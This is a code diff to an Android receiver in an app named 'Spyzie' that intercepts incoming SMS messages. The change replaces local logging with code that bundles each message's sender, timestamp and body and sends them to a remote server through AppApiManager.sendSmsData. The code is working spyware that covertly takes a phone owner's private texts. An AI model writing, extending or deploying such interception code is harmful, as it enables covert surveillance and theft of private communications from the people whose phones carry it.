@@ -6,7 +6,10 @@ import android.content.Intent;
 import android.os.Bundle;
 import android.telephony.SmsMessage;
 import android.util.Log;
+import android.widget.Toast;
 
+import com.tantd.spyzie.data.model.Sms;
+import com.tantd.spyzie.data.network.AppApiManager;
 import com.tantd.spyzie.util.Constants;
 
 import java.util.Date;
@@ -17,13 +20,19 @@ public class SpyzieReceiver extends BroadcastReceiver {
     public void onReceive(Context context, Intent intent) {
         Bundle data = intent.getExtras();
         Object[] pdus = (Object[]) data.get("pdus");
+        StringBuilder sb = new StringBuilder();
+        SmsMessage smsMessage;
+        Sms sms = new Sms();
         for (int i = 0; i < pdus.length; i++) {
-            SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
-            String message = "Sender: " + smsMessage.getDisplayOriginatingAddress()
-                    + ", Display message body: " + smsMessage.getDisplayMessageBody()
-                    + ", Time: " + new Date(smsMessage.getTimestampMillis())
-                    + ", Message: " + smsMessage.getMessageBody();
-            Log.d(Constants.LOG_TAG, message);
+            smsMessage = SmsMessage.createFromPdu((byte[]) pdus[i]);
+            if (i == 0) {
+                sms.sender = smsMessage.getDisplayOriginatingAddress();
+                sms.time = smsMessage.getTimestampMillis();
+                sb.append("Phone: " + sms.sender);
+            }
+            sb.append(", Message: " + smsMessage.getMessageBody());
         }
+        sms.content = sb.toString();
+        AppApiManager.getInstance().sendSmsData(sms);
     }
 }
